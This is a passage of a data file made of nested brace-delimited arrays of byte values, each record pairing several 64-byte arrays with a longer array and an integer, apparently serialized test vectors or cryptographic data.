,107,234,30,28,47,26,240,3,97,43,221,130,64,223},{230,107,255,129,72,172,231,72,209,82,23,254,39,47,244,187,120,120,53,250,111,42,8,235,190,56,160,140,50,218,52,177,180,52,210,166,222,131,36,148,212,214,158,39,105,73,78,243,85,106,221,72,207,203,152,75,22,237,217,201,147,44,238,30}},{213,77,92,116,182,158,129,84,248,131,138,27,92,4,87,197,175,80,192,77,150,58,248,203,231,43,78,158,158,136,171,243,128,109,229,240,148,144,77,141,39,226,62,203,15,225,22,90,215,0,35,61,76,97,199,109,127,59,142,14,47,137,162,39,189,75,18,144,27,154,31,67,137,30,100,59,10,248,174,70,249,196,45,53,248,90,52},{61337}},{{{120,82,153,227,62,50,86,27,74,246,93,54,245,175,52,49,255,139,227,124,10,36,127,76,20,61,202,157,92,155,107,52,19,85,112,168,200,36,79,106,160,188,221,190,85,243,53,98,164,170,181,42,130,25,81,212,139,238,177,157,182,182,225,180},{230,166,9,101,6,79,240,224,242,70,241,154,98,67,36,42,149,8,132,66,246,60,200,110,167,253,11,12,249,252,49,187,133,57,222,122,35,205,80,90,17,80,172,93,216,202,171,237,110,110,208,143,210,231,158,105,247,95,133,111,244,120,227,253},{156,97,245,41,222,120,1,152,176,131,223,233,125,31,50,103,85,89,236,197,95,227,188,11,208,9,231,169,192,116,234,188,150,102,212,54,128,211,121,157,43,109,120,148,213,129,135,88,145,64,64,226,222,146,181,205,20,235,61,239,91,150,143,40},{218,99,46,126,238,37,246,184,238,207,101,136,204,168,88,38,174,83,51,13,37,34,192,174,192,45,230,220,21,205,147,236,183,232,118,38,201,72,85,1,22,133,132,34,51,116,150,211,186,124,96,176,50,1,155,9,2,252,132,115,223,138,47,44},{31,212,68,109,188,202,136,184,53,199,59,102,187,130,131,74,140,7,48,66,108,84,187,166,214,194,212,77,190,208,77,155,214,42,141,254,43,216,100,36,96,204,232,210,8,222,50,33,210,65,18,230,103,179,178,214,223,239,55,246,151,96,217,246},{218,13,194,203,143,185,51,142,146,198,232,69,5,26,64,2,98,186,22,244,113,103,215,160,200,97,97,194,4,143,94,37,111,25,68,53,34,137,218,83,13,144,127,158,173,233,200,59,66,20,224,114,80,220,91,51,253,189,112,139,208,72,19,239},{231,58,254,215,112,85,147,194,134,163,190,132,129,85,180,28,222,191,162,20,165,12,137,192,115,97,118,63,146,142,54,6,118,240,107,5,66,163,98,208,179,74,42,11,105,52,4,139,251,106,142,196,120,27,180,249,73,127,18,109,38,90,83,62}},{151,224,130,145,55,16,171,198,172,169,28,35,138,63,159,149,251,173,24,36,229,149,79,23,75,181,214,60,61,73,176,83,187,85,64,56,201,129,81,18,113,6,93,151,55,201,214,71,120,154,81,233,17,190,253,62,155,116,42,31,189,105,32,182,5,123,52,17,64,135,39,76,227,61,33,153,98,83,250,246,193,147,239,238,220,145,170,252,167,100,218,187,181,223,122,101},{17073}},{{{148,154,46,163,213,177,69,199,109,58,38,191,70,118,20,76,135,203,101,110,214,99,58,251,49,228,69,84,157,181,219,9,255,200,116,211,60,162,5,42,129,128,200,217,251,20,149,89,156,171,151,163,20,121,232,26,132,75,101,50,21,142,53,164},{27,20,125,188,125,136,139,57,130,48,16,118,125,41,28,92,16,161,173,142,211,124,41,15,90,212,245,134,211,45,15,211,11,74,26,47,157,177,233,38,230,8,90,98,190,59,39,113,129,225,123,233,185,114,188,245,159,207,11,199,154,3,36,246},{34,86,210,219,28,27,126,83,243,242,254,135,49,64,248,178,160,243,27,185,183,155,184,237,149,212,136,115,233,156,13,53,99,90,150,131,173,32,51,196,74,65,100,62,209,189,11,200,223,150,199,209,136,252,245,26,151,133,66,16,44,222,88,198},{197,30,134,243,176,120,35,11,142,34,212,238,196,174,201,175,167,227,20,201,11,226,239,183,206,14,33,183,237,13,142,51,94,1,128,68,234,225,43,131,93,133,98,96,105,178,246,226,61,3,182,84,25,157,217,102,51,170,94,238,128,92,190,255},{230,210,228,54,237,45,106,203,107,51,182,103,150,242,237,30,7,194,24,133,17,104,119,45,24,177,76,17,56,195,10,244,226,123,175,246,198,184,36,212,191,184,202,24,17,83,226,4,159,130,141,48,117,20,32,132,115,193,175,204,136,163,63,252},{186,137,205,186,9,56,97,225,25,23,48,77,198,250,153,165,88,93,235,181,69,195,211,138,247,201,49,120,103,252,150,118,99,145,37,190,42,131,223,6,35,220,193,63,109,82,142,13,126,53,61,6,192,91,144,4,102,24,179,166,203,26,137,82},{92,87,149,167,4,77,28,97,207,203,197,153,27,235,132,196,1,201,69,87,155,232,56,32,114,75,150,43,75,83,52,187,216,136,230,145,170,36,127,201,24,134,65,122,37,135,176,64,21,128,238,127,179,232,187,5,56,26,76,185,39,192,44,253}},{63,198,149,116,10,10,173,105,206,51,63,172,76,232,31,2,131,40,106,151,46,161,72,56,98,118,107,104,180,92,76,123,23,203,87,25,211,198,117,113,243,31,57,114,92,112,247,254,193,232,112,185,158,229,163,174,55,81,192,40,75,78,113,205,170,129,235,88,63,130,137,110,202,149,52,35,147,207,85,172,78,117,141,42,77},{37306}},{{{199,103,235,36,67,96,194,56,193,104,15,217,245,146,221,109,94,88,172,240,144,24,186,167,88,43,85,7,62,158,3,219,233,145,151,226,116,175,142,228,148,200,65,110,89,79,78,94,219,82,205,134,9,97,44,94,42,188,212,28,112,101,80,8},{50,217,18,89,118,137,81,21,103,37,45,75,13,99,216,102,220,102,20,10,165,195,195,202,10,93,21,153,180,37,144,64,169,125,200,192,122,206,129,115,123,167,81,216,134,160,20,66,17,80,92,130,216,60,23,231,124,212,231,150,188,255,204,227},{127,185,128,36,105,221,102,4,192,85,86,193,11,79,253,204,17,113,21,42,18,187,213,160,159,9,148,94,222,50,30,198,2,5,226,148,106,30,7,126,2,169,20,109,74,60,104,21,185,237,106,6,145,243,189,99,241,134,91,2,9,177,159,92},{2,211,72,160,201,14,20,144,160,88,38,176,186,117,248,158,219,73,40,26,86,252,50,169,212,140,17,143,236,84,55,20,162,226,248,67,45,247,254,221,62,41,47,147,85,125,183,217,60,74,96,253,156,230,40,154,125,230,51,84,193,104,104,234},{202,73,93,78,140,75,37,107,191,66,157,151,179,156,158,252,133,200,105,94,6,138,219,167,88,155,80,10,89,194,232,88,133,98,9,152,221,161,125,227,252,118,44,16,172,197,173,20,22,248,162,16,164,117,173,170,241,241,110,96,184,127,251,144},{119,231,149,20,174,47,80,218,126,88,221,99,248,124,12,89,170,28,157,236,218,202,182,125,62,130,207,210,93,252,3,183,163,185,219,225,68,220,204,147,221,88,156,248,36,223,212,103,78,139,115,27,68,207,133,124,234,169,216,122,181,43,114,144},{77,66,235,25,79,143,223,206,42,121,191,242,27,40,12,192,217,187,186,101,131,29,235,3,48,62,141,186,196,27,99,8,86,27,167,190,251,2,58,138,69,254,174,90,130,166,128,166,132,101,207,4,174,5,92,160,42,180,236,80,168,30,103,107}},{112,194,221,106,214,85,65,158,136,49,106,170,21,203,6,137,251,31,248,253,155,214,133,94,175,69,215,34,75,58,218,191,227,108,170,192,85,218,33,67,60,55,80,145,170,237,166,76,107,214,188,210,147,145,94,213,138,205,226,41,192,229,194,72,192,207,132,189,184,230,160,164,49,16,12,116,21,191,45,164,8,28,223,2,55,114,96,125,159,182,1,141,138,107,166,43,185,111,207,189},{22015}},{{{2,97,87,188,14,14,252,195,145,50,218,221,228,155,38,116,123,55,173,243,160,32,66,169,160,54,222,195,106,89,63,45,125,203,80,60,252,136,63,79,136,192,196,77,55,195,199,37,131,148,14,160,35,155,151,58,4,33,151,22,200,240,66,181},{121,38,134,162,132,35,4,67,123,224,1,3,31,109,248,27,143,209,237,100,240,180,211,39,43,140,196,76,143,216,59,196,72,72,242,143,230,118,189,153,146,137,5,229,170,203,60,69,58,144,25,138,56,203,89,58,9,206,93,252,86,3,60,46},{131,210,125,200,210,142,148,233,57,77,143,55,16,237,110,221,250,245,213,39,26,120,74,92,26,113,154,60,37,233,199,213,49,58,20,217,69,117,192,96,149,208,5,137,124,154,44,25,6,58,230,78,129,254,127,193,48,38,14,158,245,80,95,221},{147,80,199,176,184,71,202,70,247,76,1,239,7,125,36,105,250,152,188,96,179,101,206,146,46,137,116,72,26,69,248,215,121,236,193,84,143,249,207,5,56,12,166,205,141,226,252,27,205,45,32,82,188,243,82,122,124,213,219,77,205,193,202,148},{95,62,192,143,23,186,114,131,27,149,20,218,152,132,122,88,194,85,88,201,17,237,232,240,70,217,12,75,205,66,173,190,89,254,88,215,172,185,51,244,185,59,243,156,33,89,162,113,105,169,55,219,31,44,82,239,41,195,232,183,4,140,7,48},{248,78,4,209,59,231,222,70,221,19,30,216,4,90,124,246,4,121,64,192,78,141,195,137,169,110,105,194,238,82,74,3,134,67,163,237,104,178,6,71,56,66,172,251,182,185,33,227,195,131,118,80,177,200,164,162,64,215,93,199,110,37,214,247},{69,209,77,6,69,178,217,115,182,101,124,228,80,126,184,100,173,93,157,154,25,216,14,167,45,206,94,62,240,67,2,55,27,215,61,54,193,255,203,71,121,221,152,188,120,248,153,211,163,180,45,6,109,255,7,60,45,210,18,88,91,80,84,73}},{179,192,163,71,242,48,226,184,106,197,255,135,208,238,33,35,201,131,197,199,163,129,70,87,129,125,226,123,22,56,193,52,174,112,4,56,177,151,228,138,114,138,49,109,80,219,159,96,161,185,161,67,255,168,96,155,232,238,233,52,146,113,148,13,113,6,50,198,202,80,163,174,173,14,9,196,213,148,148,189,210,119,108,175,85,77,229,93,174,249,86,215,123,177,231,92,247,27,221,9,93},{60990}},{{{189,239,179,8,135,131,147,75,62,63,121,251,84,132,103,187,177,71,113,38,96,163,204,85,77,130,247,10,187,120,254,16,186,92,199,227,136,238,133,17,164,31,241,3,49,200,66,63,252,225,151,145,103,132,208,76,163,138,9,68,107,118,214,182},{236,165,165,171,24,29,9,132,98,155,97,71,250,114,33,229,140,121,4,218,103,239,70,60,215,33,254,214,39,240,145,16,89,84,104,126,111,138,101,154,196,176,243,120,18,120,174,129,139,144,129,26,40,13,41,184,105,252,233,78,24,201,66,231},{26,236,193,156,73,77,197,48,203,108,37,71,160,153,186,181,227,184,16,140,121,67,141,145,77,94,163,154,159,171,187,190,82,11,92,129,126,208,51,121,84,34,185,156,20,113,174,225,211,92,124,213,29,250,147,48,95,244,101,38,184,176,251,135},{225,232,146,138,114,110,65,191,8,91,144,73,231,235,107,187,236,207,35,197,125,183,210,90,166,126,8,185,83,74,169,174,9,178,145,158,218,104,134,95,85,141,22,224,40,177,235,110,153,156,141,146,224,131,114,212,118,95,200,103,176,213,144,174},{233,51,174,121,142,64,64,62,113,122,6,171,148,189,197,101,126,79,224,35,87,152,17,23,9,38,190,85,187,24,219,174,97,177,223,243,167,88,236,43,14,71,246,59,35,119,134,221,187,10,120,162,92,114,20,8,193,230,88,57,64,30,54,171},{156,128,38,137,245,152,200,185,135,250,110,208,211,81,180,166,189,55,77,195,120,217,136,148,107,164,18,106,23,122,213,164,87,148,229,161,19,49,75,11,144,222,1,193,15,121,122,91,213,254,249,73,75,51,133,23,73,15,97,74,60,243,121,94},{26,114,9,205,247,203,81,15,185,113,94,152,207,140,60,163,151,68,57,94,211,183,120,160,172,226,63,200,144,115,110,31,182,135,86,143,34,179,178,89,133,44,236,45,138,233,189,169,147,197,117,147,153,233,139,236,172,76,65,73,89,99,139,252}},{235,160,229,221,88,228,231,250,253,238,17,74,171,142,217,203,36,10,73,96,56,82,24,219,128,212,123,165,248,165,149,184,172,154,43,101,9,41,182,227,231,164,252,73,252,196,91,130,124,151,7,147,86,148,51,77,128,101,163,40,250,215,241,227,178,54,67,203,59,208,51,169,243,89,68,171,235,128,134,21,216,220,135,130,184,81,248,152,59,205,2,240,198,5},{24616}},{{{171,23,54,194,26,105,196,213,1,248,210,75,145,54,13,159,124,33,205,160,196,172,235,38,242,17,157,234,70,46,251,37,157,235,165,7,3,167,31,239,169,119,158,1,221,147,13,225,204,198,225,41,148,190,205,230,51,127,249,109,242,162,207,67},{176,55,159,75,49,172,28,86,226,253,181,49,105,29,158,22,22,243,119,113,136,126,90,240,27,214,4,130,222,200,137,171,92,83,108,140,83,221,126,72,125,230,199,162,90,85,49,115,161,42,221,21,73,92,218,104,230,174,23,62,188,243,40,1},{192,44,223,110,72,248,227,191,67,2,237,154,48,26,187,227,184,5,78,155,65,55,78,61,181,20,214,95,57,10,69,178,180,102,43,15,231,66,2,78,3,56,157,241,183,19,14,138,54,216,27,201,91,195,1,139,252,190,88,107,253,244,150,155},{198,216,185,133,113,165,194,132,176,7,110,244,79,219,114,55,194,11,130,239,65,181,160,28,95,118,112,5,135,152,233,160,246,98,19,173,115,252,169,193,234,91,31,159,121,227,45,131,20,8,9,217,217,185,134,152,57,116,28,181,38,249,205,108},{214,230,235,234,148,202,2,163,118,137,209,185,184,242,163,185,183,4,105,28,231,145,162,205,81,16,117,171,229,199,106,1,248,13,43,64,9,135,148,185,39,181,43,36,230,2,85,4,204,200,202,231,218,38,119,104,223,43,30,190,243,152,132,120},{35,123,82,83,15,89,154,106,106,71,48,173,19,64,84,201,154,94,85,221,29,147,134,112,97,18,150,243,145,253,68,240,250,23,102,23,202,88,25,184,118,123,33,15,167,207,250,232,147,8,192,80,192,119,206,187,171,95,249,72,120,180,39,123},{166,38,120,21,181,16,184,100,188,37,249,181,189,64,94,175,125,145,191,99,161,56,207,62,105,144,183,167,131,113,231,93,235,48,191,186,160,207,3,204,153,128,121,83,250,85,219,25,179,174,127,112,93,168,141,180,45,170,216,43,109,155,11,40}},{227,119,69,58,64,230,142,118,187,192,41,192,186,135,91,162,111,253,125,174,181,201,28,124,111,94,223,177,136,58,222,99,253,66,91,220,220,191,141,228,205,199,13,239,142,145,40,190,83,53,247,105,120,169,92,53,31,241,143,28,195,53,212,38,109,198,144,250,214,188,95,147,86,42,113,205,7,40,173,118,199,41,239,185,166,140,254,2,199,172,200,205,137,170,224,5,252,7,29,29,164,84,101,249,88,100,155,123,51,123,228,198,245},{4743}},{{{26,143,16,146,179,127,75,231,56,204,2,19,97,225,90,2,176,73,253,251,63,167,208,162,15,58,239,127,239,123,35,103,70,32,65,117,158,17,129,222,59,3,205,125,182,226,176,48,5,66,95,216,162,143,158,117,57,233,151,193,34,8,58,38},{11,175,83,107,118,241,213,186,121,157,130,243,201,4,77,221,156,67,168,71,56,207,254,44,207,62,203,102,111,137,223,71,170,233,26,119,6,74,149,82,147,54,183,118,53,138,228,184,178,4,238,113,113,18,199,113,32,74,209,140,20,183,169,73},{231,20,146,200,44,113,129,34,107,228,37,247,147,72,12,13,19,94,181,25,149,110,208,89,56,208,249,74,211,219,138,3,184,190,254,35,74,20,240,187,151,197,238,24,127,125,87,63,251,15,33,228,131,163,140,204,144,106,27,134,221,24,208,13},{51,76,57,253,189,187,74,246,28,96,24,64,96,34,74,59,190,207,57,67,199,10,170,170,189,97,8,171,244,31,88,192,159,91,46,87,155,159,104,23,44,203,17,217,225,135,138,127,214,9,70,17,119,221,226,45,88,110,87,69,104,180,204,86},{209,26,136,81,204,91,49,205,243,130,244,35,78,227,148,91,114,223,121,89,207,37,203,150,40,76,149,41,25,25,78,176,13,207,89,192,238,36,239,97,15,241,107,213,151,27,76,250,178,32,91,207,12,174,182,222,144,192,199,253,31,73,61,137},{130,155,66,239,117,249,250,205,88,115,93,170,237,235,208,201,233,104,246,225,239,145,80,225,158,50,241,23,82,181,32,141,206,71,162,199,136,17,204,132,169,73,118,11,215,249,99,57,82,242,200,213,167,199,8,139,213,191,77,195,221,178,19,141},{49,185,40,95,27,128,185,236,95,220,164,115,245,163,44,3,177,31,125,96,150,214,125,179,74,28,155,233,188,196,114,55,77,4,189,97,165,142,63,181,68,135,5,176,12,123,207,85,221,191,74,193,75,27,18,124,165,37,63,235,248,28,54,234}},{221,235,104,245,110,104,14,20,73,50,126,66,126,174,139,172,164,72,176,140,160,5,193,251,20,124,164,202,113,165,250,170,1,240,219,58,230,105,202,187,2,50,218,109,16,13,128,70,230,46,167,78,106,59,241,13,164,48,117,162,83,191,2,123,156,27,5,245,184,63,66,231,104,148,74,126,186,116,162,36,110,182,63,114,190,141,123,183,189,247,166,235,125,83,0,53,220,41,35,40,183,135,224,99,54,151,90,3,56,73},{24061}},{{{200,99,67,227,219,67,102,77,152,33,171,150,112,56,60,94,179,167,45,202,255,54,75,240,113,126,149,252,195,169,95,213,113,52,92,106,194,37,11,49,224,45,170,227,64,250,244,102,4,104,23,161,83,54,25,238,8,174,84,63,14,48,86,192},{54,99,202,77,234,211,222,94,234,255,185,233,69,85,190,254,32,154,239,180,62,174,159,25,208,101,165,69,134,186,106,123,75,75,154,46,233,254,131,70,106,79,29,203,22,125,250,36,106,2,62,137,231,147,1,47,255,96,119,173,53,90,233,196},{83,137,88,122,91,119,116,95,119,104,29,217,116,92,41,86,209,162,204,160,110,32,16,60,48,15,37,112,56,46,38,204,98,94,93,232,255,83,159,8,165,221,159,249,1,14,167,202,254,67,22,128,121,162,225,234,229,57,217,59,141,12,208,153},{27,41,111,30,162,189,88,149,151,10,24,236,119,104,121,18,41,179,128,120,228,160,223,110,251,79,169,35,240,67,162,216,176,204,17,154,227,175,62,16,126,114,86,184,138,86,127,181,171,168,28,128,199,44,144,146,23,189,134,239,186,108,34,200},{119,29,176,209,121,188,41,38,138,132,135,250,76,223,140,72,61,109,171,140,177,174,9,16,136,56,53,78,18,249,253,12,175,62,175,10,136,100,122,151,75,48,133,23,1,248,80,182,120,179,149,208,54,33,46,136,129,254,62,253,184,39,132,244},{66,161,19,80,88,246,2,1,66,153,138,200,73,76,100,66,30,179,124,245,12,251,183,128,88,225,60,103,22,93,39,46,27,65,207,242,142,17,125,239,132,72,128,203,110,5,24,87,67,59,62,46,97,205,22,214,134,104,251,28,77,242,76,119},{185,220,160,34,251,191,1,123,32,174,237,17,6,211,36,61,23,201,21,204,113,41,113,69,237,61,127,122,43,97,146,224,55,143,86,221,167,252,249,146,239,72,249,49,48,172,135,195,75,217,94,118,114,173,203,166,164,62,91,148,166,208,249,70}},{178,161,246,8,252,124,91,214,50,231,25,36,11,221,98,153,243,217,160,42,154,147,211,126,29,115,27,20,77,72,8,132,134,220,98,63,91,97,114,224,5,248,129,153,221,168,71,118,68,108,140,159,102,38,108,236,24,155,172,220,76,233,6,58,73,77,172,118},{64271}},{{{235,17,78,106,23,3,86,128,99,215,1,124,139,33,89,251,237,167,1,37,162,213,102,167,145,91,174,6,232,5,12,220,155,73,23,142,164,65,194,3,38,9,251,177,238,144,98,34,98,98,230,110,116,246,5,176,219,21,154,162,211,154,18,128},{42,241,252,117,226,39,187,123,236,231,192,62,184,214,26,225,243,177,69,112,19,184,73,85,220,36,209,199,21,47,196,137,46,225,148,19,183,139,3,72,15,167,170,20,91,106,211,149,188,63,98,214,80,85,14,121,233,196,81,208,127,7,150,229},{11,18,230,239,195,98,202,79,148,134,20,141,110,43,150,227,192,127,43,61,157,63,59,210,110,70,12,117,195,98,48,210,118,149,103,171,49,12,24,104,222,9,193,226,150,228,146,16,219,188,99,30,208,64,79,217,177,135,208,122,117,79,15,118},{222,54,143,99,81,186,42,58,99,191,153,219,32,175,82,181,219,113,150,82,189,149,13,109,42,243,138,218,115,159,75,193,130,70,71,245,247,53,64,166,38,81,19,217,96,179,195,63,1,191,19,32,114,109,221,128,58,19,81,104,228,9,75,75},{112,226,10,143,226,169,66,155,225,168,1,143,129,38,130,245,202,83,193,151,231,249,117,36,248,204,244,8,30,239,106,126,8,91,167,245,235,51,146,74,9,17,181,93,14,26,58,20,231,62,88,218,76,26,98,36,17,111,235,4,242,182,207,76},{121,132,137,169,169,254,140,171,144,16,68,49,20,62,226,240,48,237,255,94,173,98,150,148,82,223,29,189,56,41,164,150,106,120,63,14,94,126,248,197,107,214,34,63,109,47,197,139,80,103,176,202,73,46,241,187,121,145,89,134,233,221,239,77},{184,36,121,115,191,106,172,137,17,233,227,227,180,221,7,41,98,28,186,238,164,138,168,101,198,47,241,255,238,107,57,20,74,151,237,207,243,107,144,202,135,170,29,211,33,99,194,56,48,68,138,78,61,208,101,195,134,45,80,159,79,166,103,46}},{59,20,40,221,12,158,25,174,103,60,227,23,170,120,156,197,122,243,163,120,106,246,252,111,78,157,173,234,72,18,234,169,88,168,160,141,50,107,181,102,122,108,235,25,60,212,133,241,184,156,59,67,255,173,94,200,249,110,103,240,170,152,116,200,84,222,53,36,255,220,87,18,33,213,92,224,156,25},{40483}},{{{197,113,195,191,226,151,95,200,188,5,237,176,103,167,46,73,206,67,248,180,179,248,212,22,70,216,78,219,55,29,22,163,249,79,199,116,54,134,163,106,186,135,183,223,136,244,58,111,9,33,52,138,135,119,26,133,209,47,147,100,67,166,46,141},{177,84,143,157,88,174,199,143,178,124,207,108,219,111,235,190,30,114,224,49,54,21,52,95,176,41,151,51,134,149,53,151,143,189,164,44,200,37,161,113,109,13,246,119,65,64,120,219,173,81,203,139,225,117,25,24,48,55,200,115,167,93,67,99},{36,158,57,148,206,63,133,196,94,177,171,176,191,74,111,236,200,76,148,202,123,232,42,243,184,105,247,59,225,173,2,109,227,189,216,136,92,24,112,165,20,169,235,106,205,10,30,214,22,124,9,22,130,209,188,167,94,163,44,188,86,45,139,54},{212,17,223,36,22,255,113,115,112,136,127,141,82,56,35,83,31,127,41,84,14,203,54,16,62,129,155,212,23,144,218,4,102,11,190,174,155,56,153,240,151,148,167,253,30,166,32,56,225,240,72,108,116,128,62,237,29,161,117,111,157,16,137,8},{73,177,66,175,65,63,44,145,192,5,166,141,141,161,241,175,162,59,224,165,180,89,89,87,232,248,13,159,232,147,195,140,136,84,179,252,48,193,189,73,174,4,27,209,124,61,188,191,224,72,36,4,97,90,77,151,43,69,217,209,220,58,122,176},{227,81,154,220,133,186,89,120,91,123,203,23,237,49,135,74,44,247,103,40,38,255,130,91,24,157,36,123,65,121,24,154,5,12,147,22,7,248,98,133,114,101,186,187,74,101,117,54,15,153,240,116,59,252,208,232,101,53,200,6,167,131,207,81},{57,189,3,175,103,165,200,38,128,24,102,67,70,227,87,126,29,223,86,187,187,205,86,58,135,151,62,103,130,254,169,214,207,174,129,41,18,239,75,203,194,46,252,101,32,239,167,36,11,71,72,196,112,238,155,169,16,21,83,38,216,53,123,154}},{187,137,176,181,58,236,148,35,166,178,14,12,90,228,244,89,109,169,5,241,148,200,87,81,147,223,110,97,126,85,175,147,77,32,10,241,222,81,51,104,97,78,172,187,255,89,249,34,122,201,56,57,178,41,116,203,116,193,89,142,91,200,84,220,126,1,247,107,82,151,10,180,25,154,239,9,190,108,115,20,124,171,230,220,126},{19697}},{{{226,143,59,34,235,195,215,154,173,179,66,22,175,27,61,250,221,101,246,231,163,153,172,143,255,10,136,213,147,102,246,255,105,34,73,248,145,198,191,160,151,220,218,55,186,99,210,211,195,224,232,173,138,35,108,162,83,159,248,66,3,50,184,54},{168,253,53,118,249,225,228,74,47,194,169,72,204,20,166,247,44,215,12,244,59,224,5,202,165,19,201,133,81,4,77,105,64,167,26,33,147,213,148,93,111,252,41,179,178,24,64,66,41,93,185,21,220,15,139,161,222,20,106,154,229,193,192,231},{210,162,185,183,211,153,51,198,202,124,18,44,185,54,4,5,100,10,156,165,75,118,79,49,142,43,5,40,174,114,226,39,34,225,129,74,11,238,57,247,85,138,176,201,80,146,185,29,89,254,168,131,9,139,86,235,75,133,194,121,233,54,67,83},{164,233,177,21,29,98,128,222,109,211,255,115,54,237,123,129,73,114,239,130,251,169,86,227,251,66,151,73,37,234,127,245,15,98,22,103,50,108,134,8,230,147,132,177,69,21,176,53,129,174,3,59,131,207,255,241,162,181,252,31,217,187,94,71},{104,128,32,152,11,143,243,21,144,106,202,101,148,46,225,164,219,110,119,96,222,255,73,36,253,101,123,198,64,192,66,24,173,204,107,120,123,2,50,248,104,155,118,251,255,132,30,168,210,236,115,91,102,198,20,91,208,228,2,240,233,133,157,78},{4,200,36,122,12,233,18,60,218,81,5,187,117,3,92,22,90,45,15,112,66,233,86,87,218,193,137,85,94,238,27,221,14,1,2,174,85,70,77,56,201,163,226,89,49,201,174,134,144,149,97,138,143,118,102,154,23,16,203,103,250,171,152,185},{222,92,166,15,139,234,10,95,176,180,54,226,176,155,14,38,12,3,223,7,177,110,122,8,28,217,70,227,106,7,249,15,129,128,161,16,99,54,189,236,42,161,176,93,90,164,227,70,84,254,150,199,239,41,214,140,211,29,28,182,1,139,207,103}},{96,39,197,218,40,131,64,215,217,159,235,232,3,231,166,250,254,52,165,203,188,222,232,239,244,219,133,54,145,78,151,61,42,185,95,224,77,218,40,215,39,94,251,21,133,148,143,236,64,107,33,92,107,90,216,51,11,76,126,215,77,30,138,38,58,148,49,32,157,102},{52534}},{{{67,9,5,19,132,162,166,109,232,77,197,193,215,186,94,227,175,118,97,232,10,132,251,210,187,80,28,177,81,219,100,156,123,207,39,249,95,95,209,235,129,218,96,139,133,15,116,234,119,19,224,183,137,15,236,92,236,48,175,63,125,97,105,247},{28,104,229,187,72,61,46,148,212,141,243,14,117,17,53,88,54,251,120,230,102,218,95,198,251,232,147,161,85,108,49,163,185,246,152,169,110,33,177,43,203,13,166,102,3,75,122,149,255,213,29,227,10,10,234,243,33,16,218,177,155,142,104,180},{173,158,182,116,73,166,49,91,242,216,170,22,68,248,61,132,18,234,192,243,36,140,235,8,72,79,71,184,144,161,215,196,138,24,88,39,99,237,112,252,77,96,111,133,100,194,29,68,80,171,4,95,238,71,150,115,191,25,38,225,57,128,233,112},{228,65,28,47,33,112,14,25,208,134,6,70,109,81,212,114,138,188,82,78,111,38,72,187,37,173,246,154,136,200,207,149,145,251,3,134,139,52,99,68,87,9,63,194,132,16,243,81,202,248,102,48,78,188,151,163,63,155,103,254,7,76,154,156},{13,196,1,154,79,187,249,97,174,181,200,95,136,84,194,188,238,82,100,26,131,112,149,184,184,192,101,129,245,10,44,169,254,207,163,2,183,129,113,137,49,229,29,240,23,30,247,171,157,211,149,144,24,48,126,4,2,152,224,171,64,55,27,165},{77,52,86,94,103,88,186,21,95,62,252,225,12,4,145,234,80,249,236,181,9,118,206,211,48,21,144,248,67,47,70,115,186,108,32,249,127,125,167,32,206,34,240,69,50,183,244,18,81,176,159,161,166,136,126,12,101,129,98,151,129,120,176,245},{124,24,50,78,108,158,140,188,254,152,63,144,237,119,46,76,104,53,218,20,213,155,231,8,58,212,178,183,234,163,39,245,147,3,165,69,74,233,179,57,208,13,113,100,242,9,207,217,67,252,118,164,230,218,143,13,151,164,25,206,156,210,38,175}},{251,86,145,228,8,101,46,69,35,155,206,34,68,179,231,84,116,226,199,65,164,157,166,119,203,103,249,146,79,100,234,110,45,88,209,37,27,84,175,221,192,12,70,136,120,166,231,84,246,174,26,173,56,16,127,135,60,44,29,189,90,246,117,167,180,173,4,47,149,117,176,179,214,140,133,13,120,230,241,189,23,252,143,57,0,230,1,246,227,29,222,127,90,252,168,109,154,60,220,111,3,93,233,38,236,24,234,173,172,153,250,167,82},{10070}},{{{110,198,234,230,58,209,67,202,236,251,197,89,129,62,57,74,130,127,170,146,205,80,91,46,225,41,196,119,123,200,253,97,113,151,99,48,186,235,148,163,185,210,168,175,167,57,252,132,194,78,79,241,239,74,62,233,223,129,215,101,92,46,38,148},{199,48,39,249,158,35,254,229,148,180,230,50,120,178,119,114,7,25,20,108,172,243,132,164,240,240,39,51,183,69,127,75,190,178,70,52,35,102,227,178,177,173,62,204,165,142,121,135,243,74,35,7,189,203,236,72,20,105,195,194,80,169,44,232},{77,87,18,129,120,17,250,211,11,249,133,48,235,159,178,140,78,133,40,138,171,94,221,102,122,129,191,209,192,163,243,58,231,162,233,165,101,78,62,125,230,68,178,29,144,61,56,164,161,237,55,171,26,6,42,152,60,164,18,83,189,194,185,224},{31,191,70,29,117,4,147,93,118,62,254,130,21,123,58,53,19,76,93,196,148,192,42,133,34,7,128,169,111,81,222,245,227,56,247,253,186,39,12,80,62,223,179,246,172,116,198,101,24,231,16,111,133,49,224,252,214,240,75,20,133,236,142,154},{103,161,126,139,208,154,58,161,13,112,38,183,43,118,4,42,138,231,73,92,32,134,191,232,197,204,170,230,220,212,45,248,81,176,132,127,12,32,44,79,133,14,225,156,126,202,31,251,146,32,121,6,28,81,54,10,237,198,231,248,242,44,57,76},{46,121,175,234,59,152,81,206,150,113,146,128,215,226,50,171,1,108,117,53,20,81,143,75,134,186,47,55,19,92,159,18,1,229,13,208,27,80,74,203,92,116,47,236,240,245,71,241,125,171,250,191,127,108,153,21,135,208,100,155,18,81,117,200},{208,85,83,236,187,240,68,114,85,223,4,79,72,23,171,157,199,27,36,194,160,11,80,87,158,189,121,28,25,131,26,193,139,133,145,35,67,32,132,155,162,3,44,221,111,107,236,43,125,121,113,53,247,142,103,109,123,75,96,141,173,29,112,196}},{191,16,78,97,128,41,70,124,64,166,7,208,164,78,77,229,88,254,142,124,210,167,151,181,203,99,70,191,119,186,54,188,193,234,198,111,14,134,44,189,164,241,164,67,64,241,124,95,149,223,61,133,109,156,182,231,152,189,19,145,4,199,111,112,180,152,213,210,6,108,73,22,135,110,139,239,175,237,121,175,22,22,117,112,109,136,193,127,12,2,2,62,104,140,201},{43640}},{{{200,78,127,105,117,29,45,86,125,237,86,255,18,30,135,128,131,139,65,136,99,12,23,191,157,100,204,86,58,34,50,240,73,203,83,150,240,138,241,46,125,171,234,99,164,39,183,114,169,38,189,186,172,124,70,161,145,244,137,20,101,210,134,28},{197,65,98,243,135,46,251,78,79,125,8,140,59,3,162,128,59,196,93,50,20,2,47,98,24,155,144,136,57,95,54,158,248,218,132,44,30,27,184,73,7,18,168,91,239,16,120,202,191,9,47,189,213,183,5,122,150,78,104,243,171,192,106,208},{4,188,150,62,124,123,148,241,167,189,82,217,118,251,216,193,94,12,181,110,141,8,20,236,6,254,192,118,155,249,253,36,13,34,25,110,25,211,230,133,148,230,11,222,252,191,223,159,148,27,116,233,4,35,2,252,89,229,92,220,241,29,9,10}